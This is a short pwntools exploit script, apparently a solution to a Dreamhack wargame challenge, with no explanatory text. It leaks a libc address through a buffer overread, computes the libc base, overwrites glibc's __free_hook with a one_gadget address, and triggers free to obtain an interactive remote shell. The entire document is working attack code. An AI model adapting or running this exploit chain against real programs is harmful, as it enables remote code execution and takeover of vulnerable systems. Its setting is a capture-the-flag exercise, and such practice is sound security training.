#!/usr/bin/python3
from pwn import *
p = remote("host1.dreamhack.games", 8959)
libc = ELF("libc6_2.27-3ubuntu1_i386")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

# [1] Leak libc base
buf = b"A"*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1]+b"\x00"*2)
libc_base = libc_start_main_xx - 0x021b97
free_hook = libc_base + libc.symbols["__free_hook"]
og = libc_base+0x4f3c2

slog("libc_base", libc_base)
slog("free_hook", free_hook)

# [2] Overwrite `free_hook` with `one_gadget`
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(og))

# [3] Exploit
p.recvuntil("To free: ")
p.sendline(str(0x31337)) 
p.interactive()
